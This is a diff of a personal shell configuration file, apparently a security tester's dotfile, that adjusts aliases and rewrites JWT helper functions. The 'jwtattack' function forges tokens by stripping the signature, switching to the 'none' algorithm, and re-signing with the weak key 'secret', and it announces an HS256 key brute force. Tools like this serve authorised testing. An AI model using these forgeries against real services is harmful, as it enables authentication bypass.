@@ -64,8 +64,9 @@ alias du="du -h"        # human readable
 alias free="free -ht"   # human readable + total
 alias mkdir="mkdir -pv" # always make it and be verbose
 alias wget="wget -c"    # continue download
-alias docker="sudo docker"
+alias docker="podman"
 alias td="tr -d '\n'"
+alias bd="base64 -d <<<"  # Quick base64 decoding
 
 alias vpnon="nmcli connection up wg0"
 alias vpnoff="nmcli connection down wg0"
@@ -187,13 +188,15 @@ genpass() { < /dev/urandom tr -dc _A-Z-a-z-0-9 | head -c"${1:-32}";echo; }
 
 # JWT functions
 jwtdecode() {
-  printf "%s" "$@" | python3 -c 'import jwt;import sys; e=sys.stdin.read();print("Header: ",jwt.get_unverified_header(e));print("Body: ",jwt.decode(e, options={"verify_signature": False}))'
+  read i
+  echo -n $i | python3 -c 'import jwt;import sys; e=sys.stdin.read();print("Header: ",jwt.get_unverified_header(e));print("Body: ",jwt.decode(e, options={"verify_signature": False}))'
 }
 
 jwtattack() {
- printf "%s" "$@" | python3 -c 'import jwt;import sys; e=sys.stdin.read();print("Null Signature: ",e[:e.rindex(".''")+1])'
- printf "%s" "$@" | python3 -c 'import jwt;import sys; e=sys.stdin.read();j=jwt.decode(e,options={"verify_signature":False});h=jwt.get_unverified_header(e);h.pop("alg");print("None algoritm: ",jwt.encode(j, key="", algorithm="none",headers=h))'
-printf "%s" "$@" | python3 -c 'import jwt;import sys; e=sys.stdin.read();j=jwt.decode(e,options={"verify_signature":False});h=jwt.get_unverified_header(e);h.pop("alg");print("Secret key HS256: ",jwt.encode(j, key="secret", algorithm="HS256",headers=h))'
+ read i
+ echo -n $i | python3 -c 'import jwt;import sys; e=sys.stdin.read();print("Null Signature: ",e[:e.rindex(".''")+1])'
+ echo -n $i | python3 -c 'import jwt;import sys; e=sys.stdin.read();j=jwt.decode(e,options={"verify_signature":False});h=jwt.get_unverified_header(e);h.pop("alg");print("None algoritm: ",jwt.encode(j, key="", algorithm="none",headers=h))'
+ echo -n $i | python3 -c 'import jwt;import sys; e=sys.stdin.read();j=jwt.decode(e,options={"verify_signature":False});h=jwt.get_unverified_header(e);h.pop("alg");print("Secret key HS256: ",jwt.encode(j, key="secret", algorithm="HS256",headers=h))'
 
 echo "Attempting to brute force key if HS256"
 
